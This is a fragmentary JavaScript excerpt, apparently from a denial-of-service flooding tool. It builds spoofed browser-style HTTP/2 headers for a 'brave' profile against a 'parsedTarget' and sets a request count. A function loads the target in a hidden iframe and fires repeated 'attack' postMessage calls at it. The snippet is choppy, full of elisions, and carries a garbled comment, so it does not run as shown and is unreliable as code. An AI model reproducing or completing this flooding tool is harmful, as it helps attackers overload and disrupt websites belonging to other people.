...
const generateHeaders = (browser) => {
    ...
    const headersMap = {
        brave: {
            ...
            ":scheme": "https",
            ":path": parsedTarget.path + "?Famod_Network",
...
let allHeaders = { ...headers3, ...headers4 };
...
const numberOfRequests = 64;
function sendCrossOriginMessage(parsedTarget, numberOfRequests) {
    const { window } = new JSDOM('<!DOCTYPE html>');
    const { document } = window;

    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = parsedTarget.href; // S? d?ng href c?a parsedTarget
    document.body.appendChild(iframe);

    iframe.onload = () => {
        for (let i = 0; i < numberOfRequests; i++) {
            iframe.contentWindow.postMessage('attack', '*');
        }
    };
}
            let retries = 5;
   ...
   sendCrossOriginMessage(parsedTarget, numberOfRequests)
